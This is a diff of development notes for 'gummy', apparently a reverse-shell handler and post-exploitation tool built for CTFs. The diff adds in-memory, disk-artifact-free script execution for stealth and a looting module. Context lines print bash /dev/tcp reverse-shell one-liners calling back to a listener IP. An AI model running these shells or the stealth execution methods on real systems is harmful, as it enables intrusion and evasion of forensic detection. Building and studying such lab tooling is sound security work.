@@ -137,19 +137,27 @@ bash -c 'exec bash >& /dev/tcp/10.10.14.5/4444 0>&1 &'
   - Module interface and registry (singleton pattern)
   - Explicit category ordering: Linux, Windows, Misc, Custom
   - Commands: `modules` (list), `run <module> [args]` (execute)
+  - **Execution Modes:**
+    - In-memory (💾) - Scripts loaded to bash variables, zero disk artifacts
+    - Disk + cleanup (🧹) - Temporary disk write, shredded after execution
+    - Disk only (💿) - Files persist on disk (intentional)
   - **Linux Modules:**
-    - `peas` - LinPEAS privilege escalation scanner
-    - `lse` - Linux Smart Enumeration (chsoares fork)
-    - `pspy` - Process monitoring without root (pspy64)
+    - `peas` - LinPEAS privilege escalation scanner (in-memory)
+    - `lse` - Linux Smart Enumeration (in-memory)
+    - `loot` - ezpz post-exploitation script (in-memory)
+    - `pspy` - Process monitoring without root (disk + cleanup)
   - **Misc Modules:**
-    - `privesc` - Bulk upload privesc scripts (platform-aware)
+    - `privesc` - Bulk upload privesc scripts (disk only, platform-aware)
   - **Custom Modules:**
-    - `sh <url>` - Run arbitrary shell scripts from URLs
-  - RunScript() for shell scripts (bash execution)
+    - `sh <url>` - Run arbitrary shell scripts from URLs (in-memory)
+  - RunScriptInMemory() for stealthy in-memory execution (new!)
+  - RunScript() for traditional disk-based execution
   - RunBinary() for executables (chmod +x, direct execution)
+  - UploadToVariable() - Load scripts to bash variables (new!)
   - Timeout support for long-running binaries (5min default)
   - Real-time output streaming to separate terminals
   - Automatic cleanup with shred (secure deletion)
+  - Module table shows execution mode symbols with legend
 - [x] **Session Directories** 🆕
   - Format: `~/.gummy/YYYY_MM_DD/IP_user_hostname/` (shared per host)
   - Lazy creation (only when needed by modules)
@@ -743,6 +751,14 @@ bash -i >& /dev/tcp/localhost/4444 0>&1
     - SSH flags: `-t` (force PTY), `-T` (no PTY), `-o` (options)
     - Background command execution in remote shells
 
+15. **In-Memory Execution** 🆕
+    - Bash variable concatenation with `+=` operator
+    - Piping variables to stdin: `echo "$var" | bash -s`
+    - Base64 encoding for safe transport of special characters
+    - Variable cleanup with `unset` command
+    - ARG_MAX awareness (bash variable size limits)
+    - Avoiding disk artifacts for stealth operations
+
 ### Architecture Patterns Used
 - **Separation of Concerns**: Listener → Manager → Handler (each has single responsibility)
 - **Interface Segregation**: `net.Conn` interface allows flexible I/O handling
@@ -755,9 +771,9 @@ bash -i >& /dev/tcp/localhost/4444 0>&1
 ## Progress Tracking
 
 **Last updated:** 2025-10-16
-**Current focus:** Module System with Linux tooling complete! 🎉
+**Current focus:** In-memory execution and stealth features complete! 🎉
 **Next milestone:** Windows modules or Session logging (see TODO.md)
-**Lines of code:** ~4,100 LOC (3,500 core + 490 UI + 110 modules)
+**Lines of code:** ~4,300 LOC (3,700 core + 510 UI + 110 modules)
 **Modules:** 13 files in `internal/` (flat structure) + 1 `main.go`
 **Status:** Production-ready for CTF use! ✅
 
@@ -767,7 +783,8 @@ bash -i >& /dev/tcp/localhost/4444 0>&1
 - ✅ **UI/UX** - Lipgloss styling, Bubble Tea confirmations, animated spinners
 - ✅ **Automation** - SSH integration, payload generation, shell spawning
 - ✅ **Reliability** - Session monitoring, buffer draining, graceful error handling
-- ✅ **Module System** - Extensible with 5 Linux modules (peas, lse, pspy, privesc, sh)
+- ✅ **Module System** - Extensible with 6 Linux modules (peas, lse, loot, pspy, privesc, sh)
+- ✅ **Stealth Operations** - In-memory script execution, zero disk artifacts
 - ⏳ **Windows modules** - URLs defined, modules not yet implemented
 - ⏳ **Session logging** - Directory structure ready, logging not implemented
 
@@ -788,13 +805,14 @@ kill <id>                    - Kill specific session
 upload <local> [remote]      - Upload file (ESC to cancel)
 download <remote> [local]    - Download file (ESC to cancel)
 
-# Modules
-modules                      - List available modules
-run peas                     - Run LinPEAS privilege escalation scanner
-run lse [-l1|-l2]            - Run Linux Smart Enumeration (default: -l1)
-run pspy                     - Monitor processes without root (5min timeout)
-run privesc                  - Upload multiple privesc scripts (platform-aware)
-run sh <url> [args]          - Run arbitrary shell script from URL
+# Modules (💾 = in-memory, 🧹 = disk+cleanup, 💿 = disk only)
+modules                      - List available modules with execution modes
+run peas                     - Run LinPEAS privilege escalation scanner (💾)
+run lse [-l1|-l2]            - Run Linux Smart Enumeration (💾, default: -l1)
+run loot                     - Run ezpz post-exploitation script (💾)
+run pspy                     - Monitor processes without root (🧹, 5min timeout)
+run privesc                  - Upload multiple privesc scripts (💿, platform-aware)
+run sh <url> [args]          - Run arbitrary shell script from URL (💾)
 
 # Utility
 help                         - Show command reference
